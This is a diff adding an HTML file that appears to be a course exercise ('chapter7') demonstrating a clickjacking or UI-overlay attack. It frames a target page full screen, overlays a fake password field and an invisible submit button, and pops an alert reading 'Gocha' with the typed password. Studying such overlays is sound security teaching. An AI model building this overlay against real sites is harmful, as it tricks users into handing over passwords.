@@ -1,0 +1,39 @@
+<iframe src="//sc.io/chapter7?code=55" frameborder="0" id="target"></iframe>
+
+<div id="fake-target">
+    <input type="password" id="password" placeholder="">
+    <button id="submit">Whatever</button>
+</div>
+
+<style>
+    #target {
+        width: 100vw;
+        height: 100vh;
+        position: absolute;
+        top: 0;
+        left: 0;
+        opacity: 1;
+    }
+
+    #password {
+        position: absolute;
+        top: 132px;
+        left: 362px;
+        width: 450px;
+        border: 0;
+        opacity: 1;
+    }
+
+    #submit {
+        position: absolute;
+        top: 180px;
+        left: 348px;
+        opacity: 0;
+    }
+</style>
+
+<script>
+    document.getElementById('submit').addEventListener('click', e => {
+        alert(`Gocha: ${document.getElementById('password').value}`);
+    }, false);
+</script>
